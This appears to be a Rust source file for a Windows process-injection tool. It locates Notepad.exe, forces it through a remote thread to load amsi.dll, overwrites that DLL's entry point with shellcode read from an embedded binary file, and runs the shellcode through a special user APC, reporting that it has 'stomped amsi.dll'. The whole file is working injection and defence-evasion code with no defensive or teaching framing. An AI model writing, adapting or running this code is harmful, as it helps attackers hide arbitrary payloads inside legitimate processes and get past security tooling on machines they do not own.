use std::{ffi::CString, mem::transmute, ops::Add, os::raw::c_void, ptr::null_mut};

use windows_sys::{
    Wdk::System::SystemInformation::NtQuerySystemInformation,
    Win32::{
        Foundation::STATUS_INFO_LENGTH_MISMATCH,
        System::{
            Diagnostics::Debug::{IMAGE_NT_HEADERS64, ReadProcessMemory, WriteProcessMemory},
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx},
            ProcessStatus::{
                EnumProcessModules, GetModuleFileNameExA, GetModuleInformation, MODULEINFO,
            },
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
            Threading::{
                CreateRemoteThread, OpenProcess, OpenThread, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
                QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, QueueUserAPC2, THREAD_SET_CONTEXT,
                WaitForSingleObject,
            },
            WindowsProgramming::{SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION},
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;

    unsafe {
        let mut return_length = 0;
        let mut status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information.");
            return pid;
        }

        let buffer_size = return_length as usize;
        let buffer: Vec<u8> = vec![0; buffer_size];

        status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_ptr() as *mut c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    &String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn get_thread_id(pid: u32) -> u32 {
    let mut tid = 0;

    unsafe {
        let mut return_length = 0;
        let mut status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information length.");
            return tid;
        }

        let buff_size = return_length as usize;
        let buffer = vec![0u8; buff_size];
        status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_ptr() as *mut c_void,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information.");
            return tid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        loop {
            if (*proc_info).UniqueProcessId as u32 == pid {
                println!("[+] Found {} Threads", (*proc_info).NumberOfThreads);

                let offset = (proc_info as usize) - (buffer.as_ptr() as usize);
                let thread_offset = offset + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>();
                let thread_info_ptr =
                    buffer.as_ptr().add(thread_offset) as *const SYSTEM_THREAD_INFORMATION;

                for i in 0..(*proc_info).NumberOfThreads {
                    let thread_info = thread_info_ptr.add(i as usize);
                    tid = (*thread_info).ClientId.UniqueThread as u32;
                    // println!("[+] Thread ID: {}", tid);
                    break;
                }
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    tid
}

fn get_entry_point(
    proc_handle: *mut c_void,
    module_base: *mut c_void,
    entry_point: &mut *mut c_void,
) -> bool {
    unsafe {
        let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
        let mut bytes_read = 0;
        if ReadProcessMemory(
            proc_handle,
            module_base,
            &mut dos_header as *mut _ as *mut c_void,
            size_of::<IMAGE_DOS_HEADER>() as usize,
            &mut bytes_read,
        ) == 0
        {
            println!("[-] Failed to read DOS header.");
            return false;
        }

        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature.");
            return false;
        }

        let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
        let mut bytes_read = 0;
        if ReadProcessMemory(
            proc_handle,
            (module_base as usize).add(dos_header.e_lfanew as usize) as *const c_void,
            &mut nt_headers as *mut _ as *mut c_void,
            size_of::<IMAGE_NT_HEADERS64>() as usize,
            &mut bytes_read,
        ) == 0
        {
            println!("[-] Failed to read NT headers.");
            return false;
        }

        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature.");
            return false;
        }

        *entry_point = (module_base as usize)
            .add(nt_headers.OptionalHeader.AddressOfEntryPoint as usize)
            as *mut c_void;
        println!("[+] Entry point address: {:?}", *entry_point);
    }

    true
}

fn main() {
    let proc_name = "Notepad.exe";
    let pid = get_pid(proc_name);

    if pid == 0 {
        println!("Process {} not found.", proc_name);
        return;
    }

    println!("[+] Found {} pid: {}", proc_name, pid);

    unsafe {
        let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const u8);
        if kernel32.is_null() {
            println!("[-] Failed to get handle for kernel32.dll.");
            return;
        }

        println!("[+] kernel32.dll handle: {:?}", kernel32);

        let load_library_addr = GetProcAddress(kernel32, "LoadLibraryA\0".as_ptr() as *const u8)
            .unwrap() as *const c_void;
        if load_library_addr.is_null() {
            println!("[-] Failed to get address for LoadLibraryA.");
            return;
        }

        println!("[+] LoadLibraryA address: {:?}", load_library_addr);

        let mod_name = CString::new("C:\\Windows\\System32\\amsi.dll").unwrap();

        let proc_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        );

        if proc_handle.is_null() {
            println!("[-] Failed to open process.");
            return;
        }

        let remote_buf = VirtualAllocEx(
            proc_handle,
            null_mut(),
            mod_name.as_bytes_with_nul().len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_buf.is_null() {
            println!("[-] Failed to allocate memory in the target process.");
            return;
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            proc_handle,
            remote_buf,
            mod_name.as_bytes_with_nul().as_ptr() as *const c_void,
            mod_name.as_bytes_with_nul().len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write to process memory.");
            return;
        }

        let thread_handle = CreateRemoteThread(
            proc_handle,
            null_mut(),
            0,
            transmute(load_library_addr),
            remote_buf,
            0,
            null_mut(),
        );

        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread.");
            return;
        }

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        let mut mods: Vec<*mut c_void> = vec![null_mut(); 1024];
        let mut cb_needed = 0;
        if EnumProcessModules(
            proc_handle,
            mods.as_mut_ptr(),
            mods.len() as u32,
            &mut cb_needed,
        ) == 0
        {
            print!("[-] Failed to enumerate process modules.");
            return;
        }

        let mut target_module = null_mut();

        for i in 0..(cb_needed / size_of::<*mut c_void>() as u32) {
            let mut mod_name = vec![0u8; 260];
            if GetModuleFileNameExA(
                proc_handle,
                mods[i as usize],
                mod_name.as_mut_ptr(),
                mod_name.len() as u32,
            ) != 0
            {
                let module_name = String::from_utf8_lossy(&mod_name)
                    .trim_end_matches('\0')
                    .to_string()
                    .split('\\')
                    .last()
                    .unwrap()
                    .to_string();
                // println!("[+] {}", module_name);

                if module_name.eq_ignore_ascii_case(String::from("amsi.dll").as_str()) {
                    println!("[+] Found amsi.dll in the target process.");
                    let mut modinfo: MODULEINFO = std::mem::zeroed();
                    if GetModuleInformation(
                        proc_handle,
                        mods[i as usize],
                        &mut modinfo,
                        size_of::<MODULEINFO>() as u32,
                    ) != 0
                    {
                        target_module = mods[i as usize];
                        println!("[+] amsi.dll base address: {:?}", target_module);
                        println!("[+] amsi.dll size: {:?}", modinfo.SizeOfImage);
                        break;
                    }
                }
            } else {
                println!("[-] Failed to get module name.");
            }
        }

        if target_module.is_null() {
            println!("[-] amsi.dll not found in the target process.");
            return;
        }

        let mut address_of_entry_point = null_mut();
        if !get_entry_point(proc_handle, target_module, &mut address_of_entry_point) {
            println!("[-] Failed to get entry point of amsi.dll.");
            return;
        }

        let mut old_protect = 0;
        if VirtualProtectEx(
            proc_handle,
            address_of_entry_point,
            SHELLCODE.len(),
            PAGE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection.");
            return;
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            proc_handle,
            address_of_entry_point,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to process memory.");
            return;
        }

        if VirtualProtectEx(
            proc_handle,
            address_of_entry_point,
            SHELLCODE.len(),
            old_protect,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to restore memory protection.");
            return;
        }

        let thread_id = get_thread_id(pid);
        if thread_id == 0 {
            println!("[-] Failed to get thread ID.");
            return;
        }

        let thread_handle = OpenThread(THREAD_SET_CONTEXT, 0, thread_id);
        if thread_handle.is_null() {
            println!("[-] Failed to open thread.");
            return;
        }

        if QueueUserAPC2(
            transmute(address_of_entry_point),
            thread_handle,
            0,
            QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
        ) == 0
        {
            println!("[-] Failed to queue APC.");
            return;
        }

        println!("[+] Successfully stomped amsi.dll");
    }
}
